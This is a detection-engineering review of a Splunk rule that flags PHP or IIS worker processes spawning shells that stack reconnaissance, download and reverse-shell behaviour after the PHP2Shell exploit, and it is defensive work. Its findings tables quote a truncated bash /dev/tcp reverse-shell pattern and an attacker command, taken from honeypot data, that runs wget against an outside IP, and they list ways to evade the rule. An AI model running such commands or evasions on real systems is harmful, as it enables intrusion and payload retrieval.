# REVIEW - DAC-WIN-0365 Sysmon: Windows PHP/IIS worker spawns a shell that stacks recon/download/revshell/tmp-exec (PHP2Shell post-exploitation)

## Attribution
Clean-room behavioural rule for PHP2Shell post-exploitation. Primary sources opened:
- Datadog Security Labs PHP2Shell article (CVE-2026-109618, CVE-2026-109619)
- AWS MadPot blog (exploitation from 17 Oct 2026, before 21 Oct disclosure)
- GitHub advisories GHSA-w8hw-w9fx-j79w and GHSA-6wmf-4rv5-p3rp on php/php-src
No exploit code, no employer telemetry, no payload logs. Fixtures are SYNTHETIC and marked not run.

## As-is (new)
No prior PHP2Shell or PHP-runtime-shell-stacking rule in this library. SigmaHQ Linux webshell rules exist publicly but do not require multi-class stacking and often omit php-fpm as parent.

## After
New splunk rule DAC-WIN-0365: PHP runtime parent -> shell child, alert when >=2 of {recon, download, revshell, tmpexec} appear for one host within 10 minutes.
Exploit phase in description: **post-exploitation / execution** (shell commands after system() hijack), not the initial multipart/PHP_SESSION_UPLOAD_PROGRESS request.

## ATT&CK v19.2
Verified against attack-stix-data enterprise-attack-19.2.json:
- T1190 Exploit Public-Facing Application (initial-access)
- T1059.004 Unix Shell / T1059.003 Windows Command Shell / T1059.001 PowerShell (execution)
- T1105 Ingress Tool Transfer (command-and-control)
- T1505.003 Web Shell (persistence)
- T1082 System Information Discovery / T1033 System Owner/User Discovery (discovery)

## Existing overlap in this repo
None for PHP2Shell. Generic office/shell and webshell rules do not require the PHP-runtime parent + multi-class stack.

## Bypass / gap table
| Bypass | Why | Mitigation / status |
|---|---|---|
| PHP-native file write or socket with no child process | No ProcessRollup2 / DeviceProcessEvents / Sysmon 1 child | Out of scope; needs file/network rules |
| Single behaviour class only (e.g. whoami alone) | Stacking threshold | Intentional near-miss |
| Obfuscated / concatenated command that hides tokens | Regex on cleartext CommandLine | Known gap; tag needs-review |
| Renamed shell binary | Image/FileName match on common shell names | Known gap |
| Linux apache2/php-fpm parent on Splunk | Windows Sysmon allowlist only | Documented Linux gap on DAC-WIN-0365; covered by MDE/CS companions |
| Initial exploit POST only, no shell yet | Wrong telemetry (web/WAF) | Out of scope by design (phase = post-exploitation) |

## Unverified
- SPL regex and `windows_sysmon` macro expansion not run in Splunk; Linux Sysmon intentionally out of scope (allowlist)
- telemetry_validated false; no real PHP2Shell payload logs in public sources at write time
- Exact php-fpm worker FileName / InitiatingProcessFileName forms per EDR build
- Whether Falcon shows apache2 (not php module) as ParentBaseFileName for mod_php

## Tests
Synthetic fixtures under tests/cases/DAC-WIN-0365/; result: **not run** (no SIEM runner; no lab payload). Each fixture sets `"synthetic": true` and `"result": "not run"`.

## Ponytail findings (applied before PR)
| # | Sev | Finding | Failing input | Fix applied |
|---|---|---|---|---|
| 1 | Must | Keying on Datadog demo reverse-shell string is brittle and vendor-advised against | exact `bash -i >& /dev/tcp/...` only | Behaviour classes, not demo strings |
| 2 | Must | Single whoami from a PHP app is common FP | `php-fpm -> sh -c 'whoami'` alone | Require classes >= 2 in 10m |
| 3 | Must | Initial exploit request is not process telemetry | oversized multipart POST | Scope description to post-exploitation phase; no web log match |
| 4 | Should | Sigma webshell rules miss php-fpm parent | parent=php-fpm8.2 | Include php-fpm* / startswith php-fpm |
| 5 | Should | Windows IIS path is php-cgi/w3wp not apache2 | ParentImage=*\w3wp.exe | Windows parents in WIN rule; Linux in MDE/CS |
| 6 | Minor | LogScale case assigns one class per event | cmd with curl and /tmp | Accept first match; stacking still needs 2 events or mixed classes across events |

## Reviewer status
pending

## Update 2026-10-26: public PHP2Shell honeypot evidence (reference only)

### Evidence
- Report: https://github.com/0x4D31/honeypot-data/blob/main/reports/php2shell/2026-10-24-confirmed-rce.md
- Dataset: https://github.com/0x4D31/honeypot-data/tree/main/reports/php2shell/2026-10-24-rce-evidence (commit 0b6a57491134c10f7cc5055999f1cb8b38c67546)
- Licence: CC-BY-4.0, owner 0x4D31. The attribution entry is added to THIRD_PARTY_NOTICES.md in PR #95 (DAC-CS-0245).

### Result for this rule (by logic, not executed)
0 of the 35 published shells, before and after. All 35 are Linux: PHP 8.4.26 under Apache mod_php, `/usr/sbin/apache2` (uid 33) starting `/bin/sh -c`. This rule only reads Windows Sysmon, excludes `sourcetype="sysmon:linux"`, and only matches `php-cgi.exe`/`php.exe`/`w3wp.exe` parents with `cmd`/`powershell`/`pwsh` children. This is the Linux gap already documented above, not a new bug.

### What changed
- Report and dataset URLs added to `references`.
- Description now says the public execution evidence is Linux-only and outside this rule's scope, and that no public Windows PHP2Shell execution evidence was found in the sources reviewed.
- One known-gap fixture, `knowngap_linux_apache_honeypot_out_of_scope_derived.json` (A01 and B16 with their child processes), field-mapped from Tetragon into a Sysmon for Linux EventID 1 shape. Derived from public honeypot evidence 0x4D31/honeypot-data (CC-BY-4.0), not native Sysmon telemetry, not run. Existing synthetic fixtures unchanged.
- Query, sourcetypes, `allowed_sourcetype_macros` and the sourcetype allowlist are **not** changed. Covering Linux in Splunk (for example `sysmon:linux` or auditd) needs Debarshi's approval first. Linux coverage sits in DAC-MDE-0096 and DAC-CS-0245.

### Ponytail findings (this change)
| # | Sev | Finding | Failing input | Fix applied |
|---|---|---|---|---|
| 1 | Info | Real PHP2Shell execution seen publicly is Linux-only; this rule cannot see it | A01 `/usr/sbin/apache2 -> /bin/sh -c -- "id>/tmp/x1;...;wget -q http://15.204.59.70:8081/ok33"` | Documented as out of scope; known-gap fixture added; no query change |

### Still unverified
- No Windows PHP2Shell execution telemetry found in public sources. The Windows parent/child assumptions remain unverified.
